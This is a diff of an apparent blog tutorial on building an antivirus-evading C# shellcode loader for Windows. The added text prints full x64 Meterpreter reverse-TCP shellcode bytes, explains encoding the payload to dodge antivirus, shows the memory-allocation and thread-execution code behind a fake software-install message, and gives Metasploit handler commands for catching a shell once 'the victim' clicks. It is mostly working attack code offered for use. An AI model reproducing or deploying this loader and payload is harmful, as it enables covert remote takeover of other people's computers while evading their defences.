@@ -86,6 +86,15 @@ byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
 };
 ```  
+Great! Now that we have the csharp payload, let's get just the payload bytes! We can do this by running the following command:  
+```bash
+$ sed -i 's/0x//g' payload.cs
+```   
+This removes the 0x in all of the bytes! To get our final payload product, just copy everything inside of the brackets of the csharp payload! Your final payload should just be hex code and commas! See the following:
+```c
+fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,48,31,d2,65,48,8b,52,60,51,56,48,8b,52,18,48,8b,52,20,48,8b,72,50,4d,31,c9,48,0f,b7,4a,4a,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,8b,48,18,50,44,8b,40,20,49,01,d0,e3,56,4d,31,c9,48,ff,c9,41,8b,34,88,48,01,d6,48,31,c0,41,c1,c9,0d,ac,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,09,25,c0,a8,1a,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,0a,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5
+```  
+
 You now have your payload and it's time to infect your victim! Except, oh wait! How do we execute it? Most methods of executing these bytes are detected by every antivirus under the sun! Head to step two to find out how to use this payload you created!  
 
 **Step 2: Creating the Loader**  
@@ -183,6 +192,54 @@ to see what the encrypted payload is. You also need to comment out the rest of y
 <img src="https://char2int.com/assets/images/6-30-23/image04.webp" alt="image04">  
 Copy the output to where you had put your payload originally, uncomment your commented code, and revert the Console.WriteLine line back to string anncouncements_enc:  
 <img src="https://char2int.com/assets/images/6-30-23/image05.webp" alt="image05">  
-Now that all of our coding is done, it's time for the fun to begin!  
+Now that all of our coding is done, it's time to explain what this does!  
+To start out with the Main(strings[] args) function, this is just the main function that the program runs. On the first couple line we are making the program write to the console to make it seem like we're installing some kind of software while we execute the payload.
+```csharp
+            string announcements_enc = dcb.get("ENCPAYLOAD", false);
+            string[] announcements = announcements_enc.Split(',');
+            byte[] f_announcements = new byte[announcements.Length];
+            for (int i = 0; i < announcements.Length; i++)
+            {
+                f_announcements[i] = Convert.ToByte(announcements[i], 16);
+            }
+```
+This piece of code grabs our stored payload bytes from the dcb.get function (which I will explain next) and then splits each byte by the comma separating them,  then adding them all into a byte array. Usually payloads are orignially just a byte array but there is a very good reason as to why we store them this way. If we were to store the bytes just as a byte array at compile time (meaning those bytes are written in by us and cane be seen in the compiled binary), then most antivirus software would be able to easily detect that we have a public payload in our program! If we store them as a string and then add them to a byte list at compile time the antivirus has a much harder time detecting that it is a payload.
+[This article](https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/index.htm) does  a very good job demonstrating this here:  
+<img src="https://char2int.com/assets/images/6-30-23/image07.webp" alt="image07">  
+Back to the dcb.get function and the dcb class as a whole. The function and class server as an extra layer of security. The dcb.get function when given a true bool, returns an encrypted string using Base64 and XOR Encryption. When a false bool is passed, it attempts to decrypt this string and give back the original string. That is why I had you change the `int two = CHANGEMETOARANDOMNUMBER;` line to a random number, because that is your encryption key and it should not be the same for everyone or that defeats the purpose.
+Finally, the last bit of code here:
+```csharp
+            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)f_announcements.Length, 0x1000, 0x40);
+            Marshal.Copy(f_announcements, 0x0000, (IntPtr)(funcAddr), f_announcements.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0x0000;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
+            WaitForSingleObject(hThread, 0xffffffff);
+            Console.WriteLine("Done!"); // Gottem
+```
+allocates virtual memory for our payload to go in to, executes it, and waits for a return to close the program. All of the DLL imports stuff after the main function is just settings up the Windows API function calls that is code uses to allocate and execute said memory.
 
 **Step 3: Execution**  
+It's finally time to attack! Open up a new terminal on Kali and type in the following commands:
+Open Metasploit Framework with the following command:  
+```bash
+$ sudo msfconsole
+```   
+Then set the exploit handler type and payload with:  
+```bash
+$ use multi/handler
+$ set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```  
+Next we need to set our attacker ip and port again to listen to:
+```bash
+$ set LHOST CHANGEME
+$ set LPORT CHANGEME  
+```  
+Finally all we need to do is:  
+```bash
+$ exploit
+```  
+aaaand now we wait!
+Now the program will wait for the victim to click on the program!
+See it in action:  
